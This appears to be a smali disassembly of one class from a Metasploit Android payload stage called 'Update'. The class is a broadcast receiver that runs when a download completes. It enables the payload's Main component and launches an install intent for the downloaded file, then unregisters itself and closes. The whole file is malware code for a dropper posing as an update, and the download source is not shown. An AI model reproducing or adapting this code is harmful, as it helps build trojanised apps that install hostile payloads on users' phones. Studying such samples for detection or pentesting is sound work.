.class Lcom/metasploit/stage/Update$1;
.super Landroid/content/BroadcastReceiver;
.source "Update.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/metasploit/stage/Update;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/metasploit/stage/Update;

.field final synthetic val$downloadId:J

.field final synthetic val$manager:Landroid/app/DownloadManager;

.field final synthetic val$uri:Landroid/net/Uri;


# direct methods
.method constructor <init>(Lcom/metasploit/stage/Update;Landroid/net/Uri;Landroid/app/DownloadManager;J)V
    .locals 0
    .param p1, "this$0"    # Lcom/metasploit/stage/Update;

    .prologue
    .line 58
    iput-object p1, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    iput-object p2, p0, Lcom/metasploit/stage/Update$1;->val$uri:Landroid/net/Uri;

    iput-object p3, p0, Lcom/metasploit/stage/Update$1;->val$manager:Landroid/app/DownloadManager;

    iput-wide p4, p0, Lcom/metasploit/stage/Update$1;->val$downloadId:J

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8
    .param p1, "ctxt"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v5, 0x1

    .line 61
    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    invoke-virtual {v3}, Lcom/metasploit/stage/Update;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    .line 62
    .local v2, "p":Landroid/content/pm/PackageManager;
    new-instance v0, Landroid/content/ComponentName;

    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    const-class v4, Lcom/metasploit/stage/Main;

    invoke-direct {v0, v3, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 64
    .local v0, "componentName":Landroid/content/ComponentName;
    invoke-virtual {v2, v0, v5, v5}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 66
    new-instance v1, Landroid/content/Intent;

    const-string/jumbo v3, "android.intent.action.VIEW"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 67
    .local v1, "install":Landroid/content/Intent;
    const/high16 v3, 0x4000000

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 68
    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->val$uri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/metasploit/stage/Update$1;->val$manager:Landroid/app/DownloadManager;

    iget-wide v6, p0, Lcom/metasploit/stage/Update$1;->val$downloadId:J

    .line 69
    invoke-virtual {v4, v6, v7}, Landroid/app/DownloadManager;->getMimeTypeForDownloadedFile(J)Ljava/lang/String;

    move-result-object v4

    .line 68
    invoke-virtual {v1, v3, v4}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 70
    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    invoke-virtual {v3, v1}, Lcom/metasploit/stage/Update;->startActivity(Landroid/content/Intent;)V

    .line 72
    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    invoke-virtual {v3, p0}, Lcom/metasploit/stage/Update;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 73
    iget-object v3, p0, Lcom/metasploit/stage/Update$1;->this$0:Lcom/metasploit/stage/Update;

    invoke-virtual {v3}, Lcom/metasploit/stage/Update;->finish()V

    .line 74
    return-void
.end method
